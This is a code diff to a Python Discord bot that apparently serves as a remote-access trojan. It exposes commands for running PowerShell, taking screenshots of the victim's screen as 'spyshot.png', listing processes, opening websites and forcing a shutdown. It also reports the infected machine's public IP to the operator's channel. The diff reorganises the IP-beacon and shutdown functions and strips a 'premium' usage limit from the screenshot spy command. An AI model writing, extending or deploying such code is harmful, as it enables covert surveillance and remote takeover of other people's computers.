@@ -30,6 +30,20 @@ async def on_ready():
 
     await bot.change_presence(activity=activity)
 
+async def send_system_active_message():
+    guild_id = 1234567890  # Replace with your guild ID
+    channel_id = 1234567890  # Replace with your channel ID
+
+    guild = bot.get_guild(guild_id)
+    channel = guild.get_channel(channel_id)
+
+    try:
+        response = requests.get('https://api.ipify.org?format=json') # Fetch Public Ip
+        ip = response.json()['ip']
+        message = f"System is active. Public IP: {ip}"
+        await channel.send(message)
+    except Exception as e:
+        print(f"Error sending system active message: {e}")
 
 # Command : Set Payload 
 @bot.command()
@@ -146,15 +160,6 @@ async def powershell(ctx, *, command: str):
 # Command: Screenshot
 @bot.command()
 async def screenshot(ctx):
-    global command_count
-    if 'command_count' not in globals():
-        command_count = {}
-
-    # Check if the user is already restricted
-    if ctx.author.id in command_count and command_count[ctx.author.id] >= 5:
-        await ctx.send("You have reached the command usage limit. Please upgrade to the premium version.")
-        return
-
     # Take a screenshot of the screen
     screenshot = pyautogui.screenshot()
 
@@ -167,11 +172,6 @@ async def screenshot(ctx):
     picture = discord.File(img_bytes, filename='spyshot.png')
     await ctx.send(file=picture)
 
-    # Update the command usage count for the user
-    if ctx.author.id not in command_count:
-        command_count[ctx.author.id] = 1
-    else:
-        command_count[ctx.author.id] += 1
 
 # Command : List Process
 @bot.command()
@@ -301,6 +301,13 @@ async def open_website(ctx, url: str):
     except Exception as e:
         await ctx.send(f'Error opening website: {str(e)}')
 
+# Command: System Shutdown
+@bot.command()
+async def sys_shutdown(ctx):
+    await ctx.send("Shutting down...")
+    await bot.logout()
+    subprocess.call("shutdown /s /t 0", shell=True)
+    
 @bot.event
 async def on_message(message):
     if message.author == bot.user:
@@ -317,30 +324,5 @@ async def on_message(message):
     
     await bot.process_commands(message)
 
-# Command: System Shutdown
-@bot.command()
-async def sys_shutdown(ctx):
-    await ctx.send("Shutting down...")
-    await bot.logout()
-    subprocess.call("shutdown /s /t 0", shell=True)
-
-# Function to send a system active message
-async def send_system_active_message():
-    await bot.wait_until_ready()
-
-  # Set the guild ID and channel ID directly
-    guild_id = 1234567890  # Replace with your guild ID
-    channel_id = 1234567890  # Replace with your channel ID
-
-    guild = bot.get_guild(guild_id)
-    channel = guild.get_channel(channel_id)
-
-    try:
-        response = requests.get('https://api.ipify.org?format=json') # Fetch Public Ip
-        ip = response.json()['ip']
-        message = f"System is active. Public IP: {ip}"
-        await channel.send(message)
-    except Exception as e:
-        print(f"Error sending system active message: {e}")
 
 bot.run('Your_Bot_Token') # Replace 'your_bot_token' with your actual bot token
